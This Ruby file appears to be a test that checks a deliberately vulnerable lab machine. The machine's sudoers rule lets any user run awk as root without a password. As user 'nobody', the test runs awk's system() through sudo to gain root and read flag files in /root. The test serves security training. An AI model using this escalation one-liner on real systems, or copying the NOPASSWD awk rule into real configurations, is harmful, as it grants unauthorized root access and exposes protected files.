require_relative '../../../../../lib/post_provision_test'


class SudoRootAwkTest < PostProvisionTest
  def initialize
    self.module_name = 'sudo_root_awk'
    self.module_path = get_module_path(__FILE__)
    super
  end

  def test_module
    super
    leaked = Array(self.json_inputs['leaked_filenames']).map(&:to_s).reject(&:empty?)
    strings = Array(self.json_inputs['strings_to_leak']).map(&:to_s)

    tier(1) do
      # config.pp's sudo::conf entries land in /etc/sudoers.d owned root:root mode 0440
      test_local_command('sudoers rule file root-owned 0440', "stat -c '%U:%G %a' /etc/sudoers.d/10_users_sudo_awk", 'root:root 440')
      test_local_command('sudoers rule allows awk as root with no password',
                         'cat /etc/sudoers.d/10_users_sudo_awk', 'ALL  ALL=(root) NOPASSWD: /bin/awk *, /usr/bin/awk *')
      test_local_command('sudoers rule allows sudo -l with no password',
                         'cat /etc/sudoers.d/10_users_sudo_list', 'ALL  ALL=(root) NOPASSWD: /usr/bin/sudo -l')

      # leaked flag files, for the account the module was given (here: any
      # account, since the misconfiguration applies to ALL users)
      leaked.each do |f|
        test_local_command("#{f} root-only in /root", "stat -c '%U:%G %a' #{Shellwords.escape("/root/#{f}")}", 'root:root 600')
      end
    end

    tier(2) do
      # any unprivileged account can list and run the awk rule without a password
      test_local_command('unprivileged user can list the awk sudo rule', 'sudo -n -l', '/bin/awk *, /usr/bin/awk *', user: 'nobody')
      # the misconfiguration: awk's system() runs a root shell via sudo
      cmd = %q{sudo -n /bin/awk 'BEGIN{system("id")}'}
      test_local_command('unprivileged user runs awk as root via sudo', cmd, 'uid=0(root)', user: 'nobody')
      # the leaked strings are readable once root
      strings.each_with_index do |s, i|
        next if s.strip.empty?
        fname = leaked[i] || leaked.first
        next unless fname
        read_cmd = %Q{sudo -n /bin/awk 'BEGIN{system("cat #{Shellwords.escape("/root/#{fname}")}")}'}
        test_local_command("unprivileged user reads leaked #{fname} via awk sudo", read_cmd, s.strip.lines.first.to_s.strip, user: 'nobody')
      end
    end
    # TODO tier 3 (exploit): no MSF module for this local sudo misconfiguration; out of scope for this batch
  end

end

SudoRootAwkTest.new.run
